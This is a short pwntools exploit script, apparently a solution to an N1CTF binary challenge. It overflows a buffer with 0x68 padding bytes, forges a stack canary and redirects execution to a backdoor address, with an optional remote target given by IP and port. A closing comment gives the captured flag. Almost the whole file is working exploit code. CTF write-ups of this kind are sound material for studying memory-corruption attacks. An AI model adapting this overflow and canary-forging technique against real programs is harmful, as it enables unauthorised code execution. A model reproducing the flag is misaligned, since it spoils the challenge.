#!/usr/bin/env python3

from pwn import *

HOST = '43.132.193.22' 
PORT = 9998

context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-v', '-F' '#{pane_pid}', '-P']

backdoor = 0x403387
user_canary = 0x4f4aa0

p = process('./a.out')
# p = remote(HOST, PORT)

gdb_script = """
b ProtectedBuffer<64ul>::getCanary
c
"""

gdb.attach(p, gdb_script)

canary = p64(user_canary) + p64(backdoor) + b'\x00'*(0x40-16)
p.sendafter('canary', canary)

b = b'A'*(0x68) + p64(0x403407) + p64(user_canary)
p.sendlineafter('pwn :)', b)

p.recvall()

# n1ctf{I_4m_Cat_Plus_P1us_Ma5ter_me0w_52e112a3df33f93}\n